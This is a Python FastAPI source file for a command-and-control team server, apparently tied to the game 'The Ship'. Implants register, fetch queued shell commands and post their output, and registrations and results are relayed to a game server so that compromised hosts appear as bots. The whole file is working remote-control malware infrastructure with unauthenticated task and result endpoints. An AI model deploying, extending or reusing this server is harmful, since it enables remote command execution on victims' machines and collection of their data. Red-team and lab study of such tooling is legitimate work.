import socket
from fastapi import FastAPI, Request
from pydantic import BaseModel

app = FastAPI(title="The Ship C2 Team Server")

# --- GLOBAL STATE ---
active_agents = {}
task_queue = []

# --- GAME SERVER CONFIG ---
# This must be the IP of your dedicated The Ship server
GAME_SERVER_IP = "10.0.2.67" 
GAME_SERVER_PORT = 8001

# --- TCP BRIDGE FUNCTIONS ---
def notify_game_server_spawn(agent_id: str):
    """Tells the game server to spawn a bot."""
    try:
        print(f"[*] Notifying Game Server to spawn: {agent_id}...")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3.0)
            s.connect((GAME_SERVER_IP, GAME_SERVER_PORT))
            payload = f"SPAWN:{agent_id}"
            s.sendall(payload.encode('utf-8'))
            print("[+] Game Server notified successfully.")
    except Exception as e:
        print(f"[-] Failed to notify Game Server (Spawn): {e}")

def notify_game_server_result(agent_id: str, command: str, output: str):
    """Pushes command results back to the game server's listener."""
    try:
        print(f"[*] Pushing results to Game Server for {agent_id}...")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3.0)
            s.connect((GAME_SERVER_IP, GAME_SERVER_PORT))
            # Format: RESULT:agent_id|command\n\noutput
            payload = f"RESULT:{agent_id}|{command}\n\n{output}"
            s.sendall(payload.encode('utf-8'))
            print("[+] Results successfully pushed to Game Server.")
    except Exception as e:
        print(f"[-] Failed to push results to Game Server (Result): {e}")

# --- DATA MODELS ---
class Task(BaseModel):
    target_id: str
    command: str

class AgentCheckIn(BaseModel):
    hostname: str

class TaskResult(BaseModel):
    command: str
    output: str

# --- IMPLANT ENDPOINTS ---
@app.post("/implant/register")
async def register_agent(agent: AgentCheckIn):
    agent_id = f"{agent.hostname}"
    active_agents[agent_id] = agent
    print(f"\n[+] Agent Registered: {agent_id}")
    
    # Trigger the bot spawn on the game server
    notify_game_server_spawn(agent_id)
    
    return {"agent_id": agent_id, "status": "registered"}

@app.get("/implant/{agent_id}/tasks")
async def fetch_tasks(agent_id: str):
    global task_queue
    # 1. Grab the tasks for this specific agent
    agent_tasks = [t for t in task_queue if t.target_id == agent_id]
    
    # 2. Delete those tasks from the queue so they only run once
    task_queue = [t for t in task_queue if t.target_id != agent_id]
    
    if agent_tasks:
        print(f"\n[*] {agent_id} successfully fetched {len(agent_tasks)} tasks.")
        
    return {"tasks_to_run": agent_tasks}

@app.post("/implant/{agent_id}/results")
async def post_results(agent_id: str, result: TaskResult):
    print(f"\n[!!!] RESULTS FROM {agent_id} [!!!]")
    print(f"Command: {result.command}")
    print(f"Output:\n{result.output}")
    print("-" * 40)
    
    # Push the results back to The Ship server
    notify_game_server_result(agent_id, result.command, result.output)
    
    return {"status": "received"}

# --- GAME/OPERATOR ENDPOINTS ---
@app.post("/game/task")
async def queue_task(task: Task):
    task_queue.append(task)
    print(f"\n[+] Task queued for '{task.target_id}': {task.command}")
    return {"status": "success", "message": f"Task queued for {task.target_id}"}